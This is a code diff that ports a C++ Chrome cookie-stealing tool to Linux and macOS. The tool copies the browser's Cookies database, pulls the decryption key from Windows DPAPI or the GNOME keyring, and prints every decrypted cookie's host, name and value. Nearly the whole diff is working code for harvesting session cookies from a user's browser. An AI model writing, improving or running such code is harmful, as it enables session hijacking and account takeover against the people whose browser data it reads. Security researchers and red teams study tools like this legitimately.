@@ -1,6 +1,8 @@
-
+#ifdef _WIN32
 #include <filesystem>
-
+#else //Still experimental for gcc
+#include <experimental/filesystem>
+#endif
 #include <sqlite3.h>  
 #include <tuple>
 #include <vector>
@@ -17,7 +19,7 @@
 #define ITERATION     1 
 #elif __APPLE_
 #define ITERATION     1003 
-#elif __unix__
+#elif __linux__
 #define ITERATION     1 
 #include <libsecret/secret.h>
 #include <string>
@@ -26,7 +28,7 @@
 
 
 #include <openssl/evp.h>
-#include <openSSL/aes.h>
+#include <openssl/aes.h>
 
 #define KEY_LEN      16
 
@@ -35,7 +37,7 @@ static bool quiet = false;
 using namespace std;
 
 
-vector<tuple<string, string, vector<unsigned char>, string>> get_encrypted_cookies_vector(char* db_path) {
+vector<tuple<string, string, vector<unsigned char>, string>> get_encrypted_cookies_vector(const char* db_path) {
     
     sqlite3* DB;
     auto sol_vector = vector<tuple<string, string, vector<unsigned char>, string>>();
@@ -108,7 +110,7 @@ vector<tuple<string, string, vector<unsigned char>, string>> get_encrypted_cooki
 
 
 
-#ifdef __unix__
+#ifdef __linux__
 std::list<std::string> name_values_;
 void Append(GHashTable* attrs_, const std::string& name, const std::string& value) {
     name_values_.push_back(name);
@@ -138,7 +140,7 @@ SecretValue* ToSingleSecret(GList* secret_items) {
 string get_key() {
 #ifdef __APPLE_
 
-#elif __unix__
+#elif __linux__
     const SecretSchema kKeystoreSchemaV2 = {
         "chrome_libsecret_os_crypt_password_v2",
         SECRET_SCHEMA_DONT_MATCH_NAME,
@@ -165,7 +167,7 @@ string get_key() {
     SecretValue * password_libsecret = ToSingleSecret(results_);
     if (password_libsecret == nullptr) {
         printf("[!] Error accessing gnome keyring. Is the user logged in (check who)?\n");
-        return -1;
+        return "";
     }
 
 
@@ -214,7 +216,7 @@ std::string AES_Decrypt_String(std::string const& data, std::string const& key, 
         return data;
 
     unsigned char decryptionIvec[AES_BLOCK_SIZE];
-    std::memcpy(decryptionIvec, &iVec[0], AES_BLOCK_SIZE);
+    memcpy(decryptionIvec, &iVec[0], AES_BLOCK_SIZE);
 
     AES_KEY AESkey;
     AES_set_decrypt_key((unsigned const char*)key.c_str(), key.size() * 8, &AESkey);
@@ -225,7 +227,7 @@ std::string AES_Decrypt_String(std::string const& data, std::string const& key, 
     {
         AES_cbc_encrypt((unsigned const char*)data.c_str() + i, buffer, AES_BLOCK_SIZE, &AESkey, decryptionIvec, AES_DECRYPT);
         value.resize(value.size() + AES_BLOCK_SIZE);
-        std::memcpy(&value[i], buffer, AES_BLOCK_SIZE);
+        memcpy(&value[i], buffer, AES_BLOCK_SIZE);
     }
 
     /* Clean Strip padding from decrypted value.
@@ -253,8 +255,8 @@ void decrypt_cookies(vector<tuple<string, string, vector<unsigned char>, string>
         LocalFree(output.pbData);
 
         if (!quiet){
-            std::cout << "host key " << host_key << " cookie_name  " << cookie_name;
-            std::cout << "decrypted_cookie " << decrypted_value << endl;
+            std::cout << "host key: " << host_key << " cookie_name: " << cookie_name;
+            std::cout << " decrypted_cookie: " << decrypted_value << endl;
         }
     }
 
@@ -268,15 +270,15 @@ void decrypt_cookies(vector<tuple<string, string, vector<unsigned char>, string>
 
     if (derived_key.empty()) {
         // error
-        return -1;
+        return;
     }
 
     for (auto& [host_key, cookie_name, encrypted_value, decrypted_value] : *cookie_vector) {
-        std::cout << "host key " << host_key << " cookie_name  " << cookie_name;
+        std::cout << "host key: " << host_key << " cookie_name: " << cookie_name;
 
         decrypted_value = AES_Decrypt_String(std::string(encrypted_value.begin(), encrypted_value.end()), derived_key, std::vector<unsigned char>(AES_BLOCK_SIZE, 0x20));
 
-        std::cout << "decrypted_cookie " << decrypted_value << endl;
+        std::cout << " decrypted_cookie: " << decrypted_value << endl;
     }
 #endif // _WIN32
 }
@@ -323,13 +325,20 @@ int main(int argc, char** argv) {
     char cookies_path[MAX_PATH] = {0};
     snprintf(cookies_path, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", username);
 #elif __APPLE_
-    auto cookies_path = "~/Library/Application Support/Google/Chrome/Default/Cookies"
-#elif __unix__
-    auto cookies_path = "~/.config/chromium/Default/Cookies";
-#endif // DEBUG
+    char cookies_path[PATH_MAX] = {0};
+    auto home = getenv("HOME");
+    snprintf(cookies_path, PATH_MAX, "%s/Library/Application Support/Google/Chrome/Default/Cookies", home);
+#elif __linux__
+    char cookies_path[PATH_MAX] = {0};
+    auto home = getenv("HOME");
+    snprintf(cookies_path, PATH_MAX, "%s/.config/google-chrome/Default/Cookies", home);
+#endif //_WIN32
 
+#ifdef _WIN32
     std::filesystem::copy(cookies_path, "Cookies_decrypted", std::filesystem::copy_options::overwrite_existing);
-
+#else
+    std::experimental::filesystem::copy(cookies_path, "Cookies_decrypted", std::experimental::filesystem::copy_options::overwrite_existing);
+#endif
     auto cookies_vector = get_encrypted_cookies_vector(cookies_path);
     
     if (cookies_vector.empty()) {
